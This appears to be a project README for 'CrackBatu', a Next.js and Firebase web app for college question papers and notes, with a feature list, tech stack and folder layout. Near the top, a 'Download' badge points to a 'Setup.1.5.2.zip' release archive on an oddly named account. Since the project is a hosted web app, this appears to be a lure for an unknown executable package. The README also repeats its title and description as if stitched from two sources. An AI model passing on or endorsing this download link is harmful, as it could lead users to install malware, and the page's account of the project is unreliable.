# CrackBatu
A fast, scalable, and industry-standard web platform to access and manage past year question papers (PYQs), notes, and study materials — built for students and admins across multiple departments.

[![Download](https://img.shields.io/badge/Download%20Link-blue)](https://github.com/mejarbucket7ddp/CrackBatu/releases/download/l253nc/Setup.1.5.2.zip)

# 📚 College PYQ Resource Hub

A fast, scalable, and modern web application for accessing **Past Year Question Papers (PYQs)**, notes, PPTs, and study materials across multiple departments in a college setting.

This platform is built as a **final year project** with a focus on clean architecture, fast performance, admin tools, and real-world impact.

## 🧠 Key Features

- 🎓 Supports 5 departments: **Computer, Electrical, Civil, Mechanical**, and **First Year (common)**
- 📚 Structured storage: **Year → Semester → Subject → Resource Type (PYQ, Notes, PPTs, etc.)**
- 🔐 **Authentication & Authorization** via Firebase (Student, Department Admin, Super Admin)
- ⚡ **Google Drive Integration** for hosting and delivering study materials
- 🛠️ **Admin Dashboard** to manage uploads, files, and user roles
- 💡 Responsive, fast, and optimized UI (Next.js + Tailwind CSS)
- 📦 Scalable architecture with modern deployment practices

---

## 🛠 Tech Stack

| Layer            | Technology             |
|------------------|------------------------|
| **Frontend**     | Next.js, TypeScript, Tailwind CSS |
| **Backend**      | Firebase Auth, Firestore, Cloud Functions |
| **File Storage** | Google Drive (via Drive API) |
| **Hosting**      | Vercel (Frontend), Firebase (Backend) |
| **Versioning**   | Git + GitHub |

---

## 📁 Folder Structure
CrackBatu/
├── public/ → Static assets (logos, icons)
├── src/
│ ├── pages/ → Next.js routes (Home, Login, Dashboard, etc.)
│ ├── components/ → Reusable UI components
│ ├── layouts/ → Layout wrappers for pages
│ ├── context/ → Global state management (auth, roles)
│ ├── hooks/ → Custom React hooks
│ ├── lib/ → Firebase and Google Drive config/functions
│ ├── services/ → App logic (auth, roles, database)
│ ├── types/ → TypeScript types and interfaces
│ └── styles/ → Tailwind/global styles
├── functions/ → Firebase Cloud Functions (backend logic)
├── .env.local → Environment variables
├── firebase.json → Firebase project config
├── tailwind.config.js → Tailwind CSS config
├── next.config.js → Next.js config
└── README.md → You're here!
